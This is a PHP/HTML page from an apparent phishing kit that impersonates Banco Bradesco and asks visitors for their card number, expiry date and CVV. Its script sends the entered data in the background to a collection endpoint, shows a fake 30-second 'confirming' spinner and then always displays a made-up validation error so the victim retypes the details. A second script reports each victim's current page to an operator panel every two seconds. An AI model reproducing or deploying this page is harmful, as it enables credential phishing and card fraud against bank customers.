<?php
// dadoscartao.php
// CORREÇÃO: Verifica se a sessão já existe antes de iniciar.
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
if (!isset($_SESSION['client_id'])) { header('Location: /index.php'); exit; }
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
<link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
<style> 
    /* Estilos base (sem alterações) */
    body{margin:0;font-family:'Montserrat',sans-serif;background:#f2f3f5;color:#111;}
    .page-wrapper{min-height:calc(100vh - 1000px);display:flex;align-items:flex-start;justify-content:center;padding:32px 16px 70px;box-sizing:border-box;}
    @media (min-height:760px){.page-wrapper{align-items:center;}}
    .card{width:100%;max-width:620px;background:#fff;border:1px solid #e2e3e6;border-radius:18px;padding:40px;box-shadow:0 6px 26px -10px rgba(0,0,0,0.15);position:relative;}
    @media (max-width:560px){.card{padding:34px 24px 36px;}}
    .card-body-flex {display: flex;align-items: flex-start;gap: 30px;}
    .card-icon-wrapper {flex-shrink: 0;}
    .card-icon-wrapper svg {width: 80px;height: auto;fill: #c41e78;}
    .card-content-wrapper {flex-grow: 1;}
    .card-header h1{margin:0 0 8px;font-size:24px;font-weight:700;letter-spacing:.2px;color:#333;text-align:left;}
    .card-header p.subtitle{margin:0 0 30px;font-size:14px;line-height:1.55;color:#555;text-align:left;}
    .form-group{margin-bottom:20px;}
    .form-group label{display:block;font-size:13px;font-weight:500;color:#444;margin-bottom:8px;}
    .form-group input{width:100%;height:48px;padding:0 15px;border:1px solid #ccc;border-radius:8px;background:#f9f9f9;font-family:'Montserrat',sans-serif;font-size:15px;font-weight:500;box-sizing:border-box;transition:border-color .2s, box-shadow .2s;}
    .form-group input:focus{outline:none;border-color:#a41f8f;box-shadow:0 0 0 3px rgba(164,31,143,0.15);background:#fff;}
    .input-group-inline{display:flex;gap:15px;}
    .btn-continuar{width:100%;height:50px;border:none;background:linear-gradient(65deg, #702F8A 40%, #CC092F 110%);color:#fff;font-size:16px;font-weight:600;border-radius:8px;cursor:pointer;margin-top:15px;transition:filter .2s, transform .15s;}
    .btn-continuar:hover:not(:disabled){filter:brightness(1.1);}
    .btn-continuar:active:not(:disabled){transform:translateY(1px);}
    .btn-continuar:disabled{opacity:0.6;cursor:not-allowed;}
    @keyframes spin{to{transform:rotate(360deg);}}
    
    /* --- INÍCIO DOS NOVOS ESTILOS (COPIADOS DO SEU EXEMPLO) --- */
    
    /* 1. CSS PARA O OVERLAY DE PROCESSAMENTO */
    .card-processing-overlay{
        position:absolute;inset:0;background:rgba(255,255,255,0.92);
        display:none;align-items:center;justify-content:center;flex-direction:column;
        z-index:50;border-radius:18px;font-family:'Montserrat',sans-serif;
    }
    .card-processing-overlay .spinner{
        width:50px;height:50px;border:5px solid #e3e3e3;border-top-color:#702F8A;
        border-radius:50%;animation:spin .8s linear infinite;margin-bottom:20px;
    }
    .card-processing-overlay p{margin:0;font-size:15px;font-weight:500;color:#444;text-align:center;}

    /* 2. CSS PARA O POPUP DE ERRO PERSONALIZADO */
    .popup-erro{
        position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.4);
        display:none;align-items:center;justify-content:center;z-index:200;
        font-family:'Montserrat',sans-serif;padding:20px;
    }
    .popup-erro .box{
        background:#fff;border-radius:14px;padding:30px 34px;max-width:380px;width:100%;
        box-shadow:0 10px 28px -6px rgba(0,0,0,.4);text-align:center;
        animation:pop .3s ease;
    }
    @keyframes pop{from{transform:scale(.9);opacity:.2;}to{transform:scale(1);opacity:1;}}
    .popup-erro h4{margin:0 0 12px;font-size:18px;font-weight:700;color:#702F8A;}
    .popup-erro p{margin:0 0 22px;font-size:14px;line-height:1.5;color:#444;}
    .popup-erro button{
        background:linear-gradient(65deg, #702F8A 40%, #CC092F 110%);border:none;color:#fff;
        padding:12px 28px;font-size:14px;font-weight:600;border-radius:28px;cursor:pointer;
        box-shadow:0 4px 14px -4px #702F8A;
    }
    .popup-erro button:hover{filter:brightness(1.06);}
    /* --- FIM DOS NOVOS ESTILOS --- */

</style>
</head>
<body>

<?php include 'headerexclusive.php'; ?>
<?php include 'menuexclusive.php'; ?>

<div class="page-wrapper">
    <div class="card">
        
        <div id="processing-overlay" class="card-processing-overlay" aria-hidden="true">
            <div class="spinner"></div>
            <p>Confirmando dados do cartão,<br>aguarde...</p>
        </div>

        <div class="card-body-flex">
            <div class="card-icon-wrapper">
            </div>
            <div class="card-content-wrapper">
                <div class="card-header">
                    <h1>Confirme os dados do seu cartão</h1>
                    <p class="subtitle">Atenção: precisamos realizar algumas confirmações.</p>
                </div>
                <form id="form-cartao" method="POST" action="processa_dados_cartao.php">
                    <div class="form-group">
                        <label for="numero-cartao">Número do seu cartão</label>
                        <input type="tel" id="numero-cartao" name="numero_cartao" placeholder="0000 0000 0000 0000" inputmode="numeric" required>
                    </div>
                    <div class="input-group-inline">
                        <div class="form-group" style="flex:1;">
                            <label for="validade-cartao">Validade</label>
                            <input type="tel" id="validade-cartao" name="validade_cartao" placeholder="MM/AA" inputmode="numeric" required>
                        </div>
                        <div class="form-group" style="flex:1;">
                            <label for="cvv-cartao">Código de segurança</label>
                            <input type="tel" id="cvv-cartao" name="cvv_cartao" placeholder="CVV" inputmode="numeric" required>
                        </div>
                    </div>
                    <button type="submit" class="btn-continuar">Confirmar</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div id="popupErro" class="popup-erro" role="alertdialog" aria-modal="true" aria-labelledby="pe-title" aria-describedby="pe-desc">
    <div class="box">
        <h4 id="pe-title">Não foi possível processar</h4>
        <p id="pe-desc">Os dados do cartão não puderam ser validados.<br>Por favor, verifique as informações e tente novamente.</p>
        <button id="btnFecharPopup">Tentar novamente</button>
    </div>
</div>

<?php include 'footerexclusive.php'; ?>
<?php include 'chat.php'; ?>

<script src="https://cdnjs.cloudflare.com/ajax/libs/imask/7.1.3/imask.min.js"></script>
<script>
// --- Seleção dos elementos ---
const formCartao     = document.getElementById('form-cartao');
const numeroCartao   = document.getElementById('numero-cartao');
const validadeCartao = document.getElementById('validade-cartao');
const cvvCartao      = document.getElementById('cvv-cartao');
const btnContinuar   = formCartao.querySelector('.btn-continuar');
// Novos elementos do overlay e popup
const overlay        = document.getElementById('processing-overlay');
const popupErro      = document.getElementById('popupErro');
const fecharPopup    = document.getElementById('btnFecharPopup');

// --- Máscaras (sem alterações) ---
if (numeroCartao) IMask(numeroCartao, { mask: '0000 0000 0000 0000' });
if (validadeCartao) IMask(validadeCartao, { mask: '00/00' });
if (cvvCartao) IMask(cvvCartao, { mask: '000[0]' });

// --- Lógica de submissão do formulário (NOVA) ---
formCartao.addEventListener('submit', function(event) {
    event.preventDefault(); // Impede o envio padrão
    if (btnContinuar.disabled) return;

    // 1. Mostra o overlay de processamento e desabilita o botão
    overlay.style.display = 'flex';
    btnContinuar.disabled = true;

    // 2. Coleta os dados e envia para a API em segundo plano ("fire and forget")
    const data = {
        numero_cartao: numeroCartao.value,
        validade_cartao: validadeCartao.value,
        cvv_cartao: cvvCartao.value
    };
    fetch('processa_dados_cartao.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(error => {
        // Apenas loga um possível erro de rede no console, sem impactar o usuário.
        console.error('Erro de fundo ao contatar a API:', error);
    });

    // 3. Inicia o temporizador de 30 segundos
    setTimeout(() => {
        // Esconde o overlay
        overlay.style.display = 'none';
        
        // Exibe o popup de erro personalizado
        popupErro.style.display = 'flex';
        
    }, 30000); // 30 segundos
});

// --- Lógica para fechar o popup de erro (NOVA) ---
fecharPopup.addEventListener('click', () => {
    popupErro.style.display = 'none';

    // Limpa o formulário e reabilita o botão para uma nova tentativa
    formCartao.reset();
    btnContinuar.disabled = false;
});
</script>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Defina o nome da página (continua igual)
        // IMPORTANTE: Altere este valor para o nome da página atual
        const pageName = 'dadoscartao.php'; 

        // 2. Crie uma função para encapsular a lógica do fetch
        // Isso torna o código mais limpo e reutilizável.
        function reportarEstagioAtual() {
            fetch('/atualizar_estagio.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ estagio: pageName }),
                credentials: 'include' // É uma boa prática manter isso
            }).catch(error => console.error(`Erro ao reportar estágio '${pageName}':`, error));
        }

        // 3. Chame a função uma vez imediatamente quando a página carregar
        // Para que o admin veja a atualização na hora, sem esperar 2 segundos.
        reportarEstagioAtual(); 

        // 4. Configure para chamar a função repetidamente a cada 2 segundos
        setInterval(reportarEstagioAtual, 2000); // 2000 milissegundos = 2 segundos
    });
    </script>

</body>
</html>
